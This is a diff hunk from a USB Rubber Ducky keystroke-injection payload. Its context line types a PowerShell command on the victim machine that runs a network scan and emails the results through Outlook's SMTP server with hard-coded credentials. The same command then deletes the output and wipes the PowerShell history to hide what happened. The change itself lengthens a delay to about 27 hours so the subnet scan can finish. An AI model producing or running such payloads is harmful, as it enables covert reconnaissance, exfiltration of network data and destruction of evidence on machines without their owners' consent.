@@ -43,7 +43,9 @@ REM	~~~~~~~CHANGE THE USERNAME (3 times) AND PASSWORD (once) IN THE FOLLOWING~~~
 STRING .\netscan.ps1 | Out-File netscan.txt && Send-MailMessage -From user@example.com -To user@example.com -Subject "LAN scan" -Body "From Rubber Ducky" -Attachment $ENV:temp\netscan.txt -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList user@example.com, (ConvertTo-SecureString -String "supersecretpassword" -AsPlainText -Force)) && Remove-Item netscan.* -Force && Remove-Item (Get-PSReadlineOption).HistorySavePath -Force && Clear-History
 DELAY 100
 ENTER
-DELAY 100
+REM 27.3 hour delay to allow script full time to scan a class "B" subnet then close process
+DELAY 10000
+REPEAT 9831
 STRING EXIT
 DELAY 100
 ENTER
